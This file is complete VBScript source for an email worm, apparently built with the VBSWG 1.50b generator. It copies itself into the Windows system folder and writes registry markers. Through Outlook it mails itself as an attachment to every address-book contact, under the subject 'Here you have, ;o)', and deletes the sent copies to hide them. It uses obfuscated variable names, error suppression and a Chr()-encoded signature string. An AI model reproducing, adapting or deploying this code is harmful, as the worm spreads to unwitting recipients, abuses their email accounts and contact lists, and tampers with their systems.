'Vbs.version1 Created By Who Cares
On Error Resume Next
Set U8o7WDT2RZ3 = CreateObject("WScript.Shell")
U8o7WDT2RZ3.regwrite "HKCU\software\version1\", Chr(87) & Chr(111) & Chr(114) & Chr(109) & Chr(32) & Chr(109) & Chr(97) & Chr(100) & Chr(101) & Chr(32) & Chr(119) & Chr(105) & Chr(116) & Chr(104) & Chr(32) & Chr(86) & Chr(98) & Chr(115) & Chr(119) & Chr(103) & Chr(32) & Chr(49) & Chr(46) & Chr(53) & Chr(48) & Chr(98)
Set c3cTW5Me70Z= Createobject("scripting.filesystemobject")
c3cTW5Me70Z.copyfile wscript.scriptfullname,c3cTW5Me70Z.GetSpecialFolder(0)& "\version1.vbs"
if U8o7WDT2RZ3.regread ("HKCU\software\version1\mailed") <> "1" then
ZxILu83zBOQ()
end if
if month(now) =1 and day(now) =1 then
msgbox "You are stupid!",16
end if
Function ZxILu83zBOQ()
On Error Resume Next
Set TLA4QjwWmxj = CreateObject("Outlook.Application")
If TLA4QjwWmxj= "Outlook"Then
Set I2K854wu99L=TLA4QjwWmxj.GetNameSpace("MAPI")
Set c8BD0hwnl5I= I2K854wu99L.AddressLists
For Each XwyN6LTJk98 In c8BD0hwnl5I
If XwyN6LTJk98.AddressEntries.Count <> 0 Then
XzL7BVYsOJ4 = XwyN6LTJk98.AddressEntries.Count
For s2YN3DoS4q7= 1 To XzL7BVYsOJ4
Set oy8T3b64u3s = TLA4QjwWmxj.CreateItem(0)
Set KX9W28GczY6 = XwyN6LTJk98.AddressEntries(s2YN3DoS4q7)
oy8T3b64u3s.To = KX9W28GczY6.Address
oy8T3b64u3s.Subject = "Here you have, ;o)"
oy8T3b64u3s.Body = "Hi:" & vbcrlf & "Check This!" & vbcrlf & ""
set W9DKT8PsfVv=oy8T3b64u3s.Attachments
W9DKT8PsfVv.Add c3cTW5Me70Z.GetSpecialFolder(0)& "\version1.vbs"
oy8T3b64u3s.DeleteAfterSubmit = True
If oy8T3b64u3s.To <> "" Then
oy8T3b64u3s.Send
U8o7WDT2RZ3.regwrite "HKCU\software\version1\mailed", "1"
End If
Next
End If
Next
end if
End Function
'Vbswg 1.50b